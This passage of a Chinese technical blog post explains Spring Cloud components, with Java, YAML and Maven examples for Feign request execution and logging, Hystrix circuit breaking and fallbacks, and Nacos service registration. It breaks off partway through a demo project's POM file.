class="comment">//最后在这里调用</span></span><br><span class="line">        <span class="keyword">return</span> executeAndDecode(template, options);</span><br><span class="line">	  .............</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>RequestTemplate</code>是做好的请求格式</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/D3JrIG2xVyRMpZh.png"
                      alt="image.png"
                ></p>
<p>我们看最后的<code>executeAndDecode</code>方法！！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object <span class="title function_">executeAndDecode</span><span class="params">(RequestTemplate template, Options options)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="comment">//构建请求</span></span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> targetRequest(template);</span><br><span class="line">	<span class="comment">//日志级别处理</span></span><br><span class="line">    <span class="keyword">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class="line">        logger.logRequest(metadata.configKey(), logLevel, request);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//响应</span></span><br><span class="line">    Response response;</span><br><span class="line">    <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//发生请求，获取响应</span></span><br><span class="line">        response = client.execute(request, options);</span><br><span class="line">        <span class="comment">// ensure the request is set. <span class="doctag">TODO:</span> remove in Feign 12</span></span><br><span class="line">       <span class="comment">//下面是一系列的格式处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到现在我们已经明白了，他是如何调用的，如何请求过去的，剩下的就是处理返回的内容，</p>
<p>其实也简单，就是对数据修饰，包装，最后变为对象类型罢了。</p>
<h2 id="部分扩展使用"><a href="#部分扩展使用" class="headerlink" title="部分扩展使用"></a>部分扩展使用</h2><h3 id="日志处理"><a href="#日志处理" class="headerlink" title="日志处理"></a>日志处理</h3><p>有时候我们遇到 Bug，比如接口调用失败、参数没收到等问题，或者想看看调用性能，就需要配置 Feign 的日志了，以此让 Feign 把请求信息输出来。</p>
<p>日志等级有 4 种，分别是：</p>
<ol>
<li><strong>NONE</strong>【性能最佳，适用于生产】：不记录任何日志（默认值）。</li>
<li><strong>BASIC</strong>【适用于生产环境追踪问题】：仅记录请求方法、URL、响应状态代码以及执行时间。</li>
<li><strong>HEADERS</strong>：记录BASIC级别的基础上，记录请求和响应的header。</li>
<li><strong>FULL</strong>【比较适用于开发及测试环境定位问题】：记录请求和响应的header、body和元数据</li>
</ol>
<p>比较常用的是在yml文件中配置</p>
<p>配置SpringBoot的日志级别：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.jimmy.mall.feigndemo.feign:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<p>配置Feign的日志</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">mall-order:</span>  <span class="comment"># 对应微服务名字</span></span><br><span class="line">        <span class="attr">loggerLevel:</span> <span class="string">FULL</span> <span class="comment"># 日志级别</span></span><br></pre></td></tr></table></figure>

<h3 id="Http客户端配置"><a href="#Http客户端配置" class="headerlink" title="Http客户端配置"></a>Http客户端配置</h3><p>我们知道Feign默认使用JDK原生的<code>URLConnection </code>发送 HTTP 请求。</p>
<p>我们可以集成别的组件来替换掉 <code>URLConnection</code>，比如 <code>Apache HttpClient</code>，<code>OkHttp</code>。</p>
<h4 id="配置OkHttp"><a href="#配置OkHttp" class="headerlink" title="配置OkHttp"></a>配置OkHttp</h4><p>一样，配置依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-okhttp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="comment"># 使用okhttp  </span></span><br><span class="line">  <span class="attr">okhttp:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>原理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration(proxyBeanMethods = false)</span></span><br><span class="line"><span class="comment">// 导入HttpClient包后该条件可以满足</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(ApacheHttpClient.class)</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingClass(&quot;com.netflix.loadbalancer.ILoadBalancer&quot;)</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(CloseableHttpClient.class)</span></span><br><span class="line"><span class="comment">// 默认已经开启</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(value = &quot;feign.httpclient.enabled&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HttpClientFeignConfiguration</span> &#123;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h1><h2 id="基础认识-2"><a href="#基础认识-2" class="headerlink" title="基础认识"></a>基础认识</h2><p>Hystrix是Netflix开源的一个延迟和容错库，用于隔离访问远程服务、第三方库，防止出现级联失败。</p>
<p>通常一个分布式系统是由许多相互依赖的服务所组成的，这些被依赖的服务极易出现故障或响应延迟的问题。</p>
<p>如果其中某个服务失败则会影响其他服务并进一步降低整体性能，并导致应用程序其他功能无法正常访问，在最坏的情况下，整个应用程序将崩溃。</p>
<p>Hystrix框架通过提供<strong>熔断</strong>和<strong>降级</strong>来控制服务之间的交互依赖，通过隔离故障服务并停止故障的级联效应以提高系统的总体弹性</p>
<p>Hystrix的<strong>熔断状态</strong>机:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/fxaSp1KRFgql4AY.png"
                      alt="image.png"
                ></p>
<p>其中有3个状态：</p>
<ul>
<li><p>Closed：关闭状态（熔断器关闭），所有请求正常访问。</p>
</li>
<li><p>Open：打开状态（熔断器打开），所有请求都会被<strong>降级</strong>。</p>
<p>Hystrix会对请求情况统计，当一定时间内失败请求百分比到达阈值，则会触发熔断，熔断器打开。默认失败比例的阈值是50%，请求次数不低于20次。</p>
</li>
<li><p>Half Open：半开状态。Open状态不是永久的，熔断器打开后一段时间（默认5秒）会进入半开状态，释放部分请求通过，如果请求正常，那么熔断器将会关闭；否则熔断器继续保持打开状态。</p>
</li>
</ul>
<p><strong>服务降级</strong>处理就是在一次请求异常或者熔断器已经打开的情况下调用一个失败回滚处理方法：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/5BnlduvwoaURH8h.png"
                      alt="image.png"
                ></p>
<p>当服务繁忙时，如果服务出现异常，不是粗暴的直接报错，而是返回一个友好的提示，虽然拒绝了用户的访问，但是会返回一个结果。</p>
<h2 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="单独使用"><a href="#单独使用" class="headerlink" title="单独使用"></a>单独使用</h3><p>导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动类配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HystrixApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(HystrixApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置方法，为远程服务调用，这里使用RestTemplate来完成，使用<code>@HystrixCommand</code>注解修饰</p>
<p>然后确定<code>FalllBack</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入restTemplate</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送远程请求方法</span></span><br><span class="line">    <span class="comment">// @HystrixCommand注解声明失败回滚方法和相关配置</span></span><br><span class="line">    <span class="meta">@HystrixCommand(fallbackMethod = &quot;fallBack&quot;, commandProperties = &#123;</span></span><br><span class="line"><span class="meta">          @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;1500&quot;),</span></span><br><span class="line"><span class="meta">          @HystrixProperty(name = &quot;circuitBreaker.requestVolumeThreshold&quot;,value = &quot;10&quot;),</span></span><br><span class="line"><span class="meta">          @HystrixProperty(name = &quot;circuitBreaker.sleepWindowInMilliseconds&quot;,value = &quot;15000&quot;),  </span></span><br><span class="line"><span class="meta">          @HystrixProperty(name = &quot;circuitBreaker.errorThresholdPercentage&quot;,value = &quot;70&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">sendRequest</span><span class="params">(Integer id)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义服务名称</span></span><br><span class="line">        String serviceName=<span class="string">&quot;liduoan-order&quot;</span>;</span><br><span class="line">        <span class="comment">// 开始时间</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">begin</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">// 查询</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:9001/liduoan_order/findOrderByUserId/&quot;</span>+id;</span><br><span class="line">        <span class="type">R</span> <span class="variable">cmspage</span> <span class="operator">=</span> restTemplate.getForObject(url, R.class);</span><br><span class="line">        <span class="comment">// 结束时间</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">// 记录访问时长</span></span><br><span class="line">        log.info(<span class="string">&quot;访问时长：&#123;&#125;&quot;</span>,end-begin);</span><br><span class="line">        <span class="keyword">return</span> cmspage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 失败回滚方法</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">fallBack</span><span class="params">(Integer id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;降级成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置TestController</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    TestService testService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;R&gt; <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        ArrayList&lt;R&gt; pages = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="type">R</span> <span class="variable">orderByUserId</span> <span class="operator">=</span> testService.sendRequest(<span class="number">1</span>);<span class="comment">//orderFeignService.findOrderByUserId(1);</span></span><br><span class="line">            <span class="comment">// System.out.println(R);</span></span><br><span class="line">            pages.add(orderByUserId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pages;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2021-07-16 10:41:21.401  INFO 10028 --- [x-TestService-1] com.example.hystrix.service.TestService  : 访问时长：2010</span><br><span class="line">2021-07-16 10:41:22.410  INFO 10028 --- [x-TestService-2] com.example.hystrix.service.TestService  : 访问时长：1517</span><br><span class="line">2021-07-16 10:41:24.133  INFO 10028 --- [x-TestService-3] com.example.hystrix.service.TestService  : 访问时长：1731</span><br><span class="line">2021-07-16 10:41:25.637  INFO 10028 --- [x-TestService-4] com.example.hystrix.service.TestService  : 访问时长：1716</span><br><span class="line">2021-07-16 10:41:26.544  INFO 10028 --- [x-TestService-5] com.example.hystrix.service.TestService  : 访问时长：1109</span><br><span class="line">2021-07-16 10:41:28.071  INFO 10028 --- [x-TestService-6] com.example.hystrix.service.TestService  : 访问时长：1521</span><br><span class="line">2021-07-16 10:41:28.922  INFO 10028 --- [x-TestService-7] com.example.hystrix.service.TestService  : 访问时长：857</span><br><span class="line">2021-07-16 10:41:30.671  INFO 10028 --- [x-TestService-8] com.example.hystrix.service.TestService  : 访问时长：1747</span><br><span class="line">2021-07-16 10:41:31.638  INFO 10028 --- [x-TestService-9] com.example.hystrix.service.TestService  : 访问时长：1200</span><br><span class="line">2021-07-16 10:41:32.741  INFO 10028 --- [-TestService-10] com.example.hystrix.service.TestService  : 访问时长：1102</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/owTK2PWRmFnz1Md.png"
                      alt="image.png"
                ></p>
<p>注意到，他一开始是2010ms，说明线程休眠了，那么就访问失败，熔断状态打开，进行降级</p>
<h3 id="配合SpringCloud"><a href="#配合SpringCloud" class="headerlink" title="配合SpringCloud"></a>配合SpringCloud</h3><p>首先我们一般都会使用Feign来做服务调用，而Feign中已经有了Hystrix的依赖</p>
<p>那么我们只需要在配置文件中配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">hystrix:</span></span><br><span class="line">  <span class="attr">command:</span></span><br><span class="line">    <span class="attr">default:</span>                   <span class="comment"># dafault表示全局生效</span></span><br><span class="line">      <span class="attr">circuitBreaker:</span></span><br><span class="line">        <span class="attr">requestVolumeThreshold:</span> <span class="number">10</span>         <span class="comment"># 熔断统计请求次数阈值</span></span><br><span class="line">        <span class="attr">sleepWindowInMilliseconds:</span> <span class="number">15000</span>   <span class="comment"># 熔断器休眠时间（单位：毫秒）</span></span><br><span class="line">        <span class="attr">errorThresholdPercentage:</span> <span class="number">70</span>       <span class="comment"># 熔断错误请求百分比阈值</span></span><br><span class="line">        <span class="attr">execution:</span></span><br><span class="line">          <span class="attr">isolation:</span></span><br><span class="line">            <span class="attr">thread:</span></span><br><span class="line">              <span class="attr">timeoutInMilliseconds:</span> <span class="number">1000</span>    <span class="comment"># 设置hystrix的超时时间(单位：毫秒)</span></span><br></pre></td></tr></table></figure>

<p>我们仅仅在Feign中配置FallBack</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;liduoan-order&quot;, path = &quot;/liduoan_order&quot;</span></span><br><span class="line"><span class="meta">,fallback = OrderFallBack.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)</span></span><br><span class="line">    R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> Integer userId)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到FallBack函数，我们是对现有的Feign—<code>OrderFeignService</code>做了一个实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderFallBack</span> <span class="keyword">implements</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">findOrderByUserId</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(userId + <span class="string">&quot;请求异常，请重试！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>主要工作流程：</p>
<p>1、当调用出现错误时，开启一个时间窗【默认10s</p>
<p>2、当这个时间窗内，统计调用次数是否达到最小请求数？</p>
<p>​	  如果没有达到，则重置统计信息，回到第一步</p>
<p>​	  如果达到了，则统计失败的请求数 占所有请求比 ，判断是否达到阈值？</p>
<p>​				达到阈值，降级处理</p>
<p>​				没有达到阈值，重置统计信息，回到第一步</p>
<p>3、如果降级处理了，也就是断路器处于开启状态，则会开启一个活动窗口【默认5s】，每隔5s，Hystrix会让一个请求通过，查看是否调用成功</p>
<p>​		如果成功，重置断路器，回到第一步</p>
<p>​		如果失败，回到第三步，保持断路器开启状态</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/8pRKwJzVi4mZLfa.png"
                      alt="image.png"
                ></p>
<h1 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h1><h2 id="基本认识"><a href="#基本认识" class="headerlink" title="基本认识"></a>基本认识</h2><p>官方文档： <a class="link"   href="https://nacos.io/zh-cn/docs/what-is-nacos.html" >https://nacos.io/zh-cn/docs/what-is-nacos.html<i class="fas fa-external-link-alt"></i></a></p>
<p>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
<p>Nacos 的关键特性包括:</p>
<ul>
<li>服务发现和服务健康监测</li>
<li>动态配置服务</li>
<li>动态 DNS 服务</li>
<li>服务及其元数据管理</li>
</ul>
<h2 id="基本使用-3"><a href="#基本使用-3" class="headerlink" title="基本使用"></a>基本使用</h2><p>这个注册中心不是和eurke一样，不需要在springboot中处理生产服务端。</p>
<p>而是我们有一个服务端，仅仅只需要注册到上面</p>
<p>pom文件中处理</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- nacos服务注册与发现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在那个配置文件中：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8045</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">mall-user-consumer-demo</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#配置nacos注册中心地址</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment">#namespace: 39e1e969-15f9-46d2-832d-fa052da55377</span></span><br><span class="line">        <span class="comment">#group: mall-user</span></span><br><span class="line">        <span class="attr">cluster-name:</span> <span class="string">BJ</span></span><br></pre></td></tr></table></figure>

<p>如此就可以注册到Nacos中了，很简单。</p>
<h1 id="最终Demo"><a href="#最终Demo" class="headerlink" title="最终Demo"></a>最终Demo</h1><h2 id="前置操作"><a href="#前置操作" class="headerlink" title="前置操作"></a>前置操作</h2><p>父工程pom：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springCloudDemo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    ..........</span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- nacos服务注册与发现 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!-- openfeign 远程调用 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!-- feign调用依赖 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.netflix.feign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.netflix.feign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后是两个微服务：·<code>liduoan_order</code>，<code>liduoan_user</code>的pom文件</p>
<p>两者的pom文件内容大致相同，就只展示一个</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springCloudDemo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- nacos服务注册与发现 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- openfeign 远程调用 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!-- feign调用依赖 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.netflix.feign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span 